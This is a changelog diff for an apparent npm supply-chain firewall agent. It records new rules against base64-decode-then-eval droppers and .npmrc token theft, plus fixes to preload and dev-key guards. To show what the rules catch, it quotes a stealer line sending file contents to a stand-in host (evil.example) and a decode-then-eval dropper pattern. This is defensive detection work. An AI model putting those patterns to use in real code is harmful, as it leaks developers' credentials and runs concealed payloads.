@@ -8,7 +8,71 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Security
+
+- **F-31 (HIGH) — base64/hex-decode → eval obfuscation is now blocked**: A comment-free
+  `Buffer.from(blob,'base64').toString(); eval(payload)` module — the classic "unpack an opaque
+  blob, then evaluate it" dropper — previously fell through as `OBSERVE` (module ran). `buffer.from`
+  and `eval(` are WARN-only signatures (F-20, since both appear in legitimate build tools), and no
+  behavioral rule covered the *decode-then-execute* combination. The one adversarial test that
+  claimed to cover this only passed because its fixture carried a `// Encodes: require('child_process').exec(...)`
+  comment whose plaintext `child_process`/`exec` strings (matched against raw content) completed
+  `DYNAMIC_CODE_EXEC_CHAIN` — so it blocked for the wrong reason and masked the gap. Added a new
+  behavioral rule `OBFUSCATED_CODE_EXECUTION` (HIGH → hard block): a base64/hex decode primitive
+  (`Buffer.from(…,'base64'/'hex')` / `atob`) matched against comment-stripped source **and** a
+  dynamic-code primitive (`eval`/`new Function`/`vm`). Neither primitive blocks alone (F-20 preserved),
+  and decode-only, eval-only, bare `Buffer.from(x)` (byte copy, no encoding), and a decode named only
+  in a comment are all verified non-blocking. The misleading fixture was stripped of its comment and
+  now blocks via the real rule; a comment-free regression test and false-positive guards were added.
+  **Engine change — mirror in aletheia-registry:** the new `CODE_DECODE` signal + `OBFUSCATED_CODE_EXECUTION`
+  rule live in `packages/fw-agent/src/behavior-tracker.js` (`SIGNAL_PATTERNS`), which the registry
+  keeps its own copy of.
+
+- **F-32 (MEDIUM) — `FW_STRICT_PRELOAD` is no longer spoofable**: The strict-preload guard decided
+  "was I injected via `--require`" by substring-searching the *joined* `process.execArgv` for
+  `fw-agent`/`helios`/`aletheia-firewall`. `node -e "require('./packages/fw-agent')"` puts the whole
+  inline script (containing `fw-agent`) into `execArgv`, so the check reported "preloaded" and silently
+  no-op'd — defeating the guarantee. It now parses `execArgv` for an actual `--require`/`-r` flag whose
+  value resolves to this agent module.
+
+- **F-33 (MEDIUM) — production dev-key guard fires without a policy file**: The dev-key refusal lived
+  inside `PolicyWatcher.start()`, which returns early when no `policy.signed.json` exists — so a
+  production deploy running the public dev key with no policy file on disk got zero signal (and a
+  policy dropped in later could be hot-loaded). Added `assertProductionKeyConfig()` (exported from
+  `policy-watcher.js`), called at agent startup before the watcher: refuses to start when
+  `NODE_ENV=production` and the bundled dev key is in use without `FW_ALLOW_DEV_POLICY_KEY=1`,
+  regardless of policy-file presence.
+
 ### Fixed
+
+- **F-34 (LOW) — `DYNAMIC_MODULE_LOAD` doc/behavior consistency**: The detector marks MEDIUM
+  behavioral violations `warnOnly`, so `index.js`'s `hasMediumOnly` quarantine branch was dead code —
+  `require(variable)` actually resulted in `OBSERVE` (module runs), contradicting the README's
+  "MEDIUM → quarantine". Since non-literal `require` is pervasive in legitimate code, the safe
+  observe behavior is correct; the docs were wrong. Removed the dead branch and aligned the docs
+  (surfaced as telemetry, not blocked).
+
+- **F-35 (tooling) — coverage gate, CI wiring, reproducible baseline, corrected audits**: Added `c8`
+  and a `test:coverage` gate (≥95% lines/functions on the five engine-core files:
+  detector/behavior-tracker/aho-corasick/policy/quarantine — currently 100% lines/functions). New
+  `behavior-tracker-unit-test.js` (the 265-line behavioral core previously had no direct test) and
+  `policy-unit-test.js`. Wired `test:integration` and `test:live` into CI (previously defined but
+  never run there) and added the coverage gate. `detection-live-test.js`'s obfuscated fixture was a
+  no-op (`Buffer.from('aWYo')` with no encoding arg → `eval` threw a `ReferenceError`, never blocked);
+  replaced with a real base64-decode+eval payload so `test:live` genuinely reports `Blocked: 2`.
+  Added `scripts/generate-baseline.js` (reproducible `.helios-baseline` regeneration) and corrected
+  `scripts/audit-{1,2,3}-*.sh` so the launch-readiness audits pass against real state (adversarial
+  count is data-driven not "16 passed"; demo block counted via the `[BLOCKED]` line the demo actually
+  prints, not the `[COMPILATION LOCKDOWN]` string it filters out; live `Blocked: 2`).
+
+- **Docs — accuracy pass**: Fixed the `packages/fw-agent/README.md` self-contradiction (policy
+  verification described as "SHA-256… not cryptographic signing" — it is Ed25519 since F-02), removed
+  the stale "Behavioral Detection Limitations" section (sub-100B and inline-require gaps fixed by
+  F-07/F-08), corrected signature counts and bypass tables (added Variable-alias eval; `Buffer.from→eval`
+  now genuinely blocked), and replaced the unsigned `{ "rules": … }` policy examples in the root README,
+  package README, and `docs/DEMO.md` (which fail signature verification → emergency lockdown) with the
+  `scripts/sign-policy.js` signing workflow. Added `docs/THREAT-COVERAGE.md` — the authoritative,
+  test-backed protection/bypass matrix.
 
 - **F-30 redo (behavioral false negative) — `.npmrc`-theft escalation missed the common attack, only the sophisticated one**: The first cut of F-30 (never applied to this repo — it landed only in `aletheia-registry`'s `engine/` copy, diverging from this source of truth) split `.npmrc` reads out of `SENSITIVE_PATH` into their own weaker `NPMRC_READ` signal, then gated `CREDENTIAL_EXFILTRATION` escalation on the literal string `_authToken` appearing in the module. Real `.npmrc`-stealers don't parse the file for a field name — they read the whole file and ship it, or POST it as-is, and never name `_authToken`. That variant fell through as `NPMRC_NETWORK_EGRESS` (WARN) instead of CRITICAL — confirmed on both a whole-file exfil (`fetch('http://evil.example/c?d='+t)`) and a POST-body exfil, neither of which name any token field. The discriminator that actually holds is the *destination*, not whether a field is parsed out: legit npm tooling builds the request URL from `.npmrc`'s config (`fetch(`${registry}/${name}`)`); theft hardcodes it. `CREDENTIAL_EXFILTRATION` now also fires on an actual token/password field reference, an explicit `{host: '...'}` override, or a hardcoded call-site URL literal whose host isn't the real npm registry (`HARDCODED_EGRESS_CALL`, anchored to the network-call argument itself — matching "any quoted URL anywhere in the file" was tried and rejected during review because it false-positived on the common `registry = match ? m[1] : 'https://registry.npmjs.org'` fallback-default idiom). A hardcoded call-site fetch of the real `registry.npmjs.org` itself softens to WARN rather than a hard block, since some legit tools hardcode it directly instead of building it from config. Added 6 regression tests to the adversarial suite (24/24 passing): the two previously-missed theft patterns, a token+host-override combination, the original legit-tooling case, and two false-positive guards for the fallback-default and hardcoded-real-registry idioms. Verified: unit/adversarial/integration/auth suites green, `.helios-baseline` regenerated and matching, and — freshly downloaded — `@vantaloom/cli` and `@vantaloom/runtime-linux-x64` both WARN (not CRITICAL) on their real `.npmrc`-reading registry-resolution code.
 
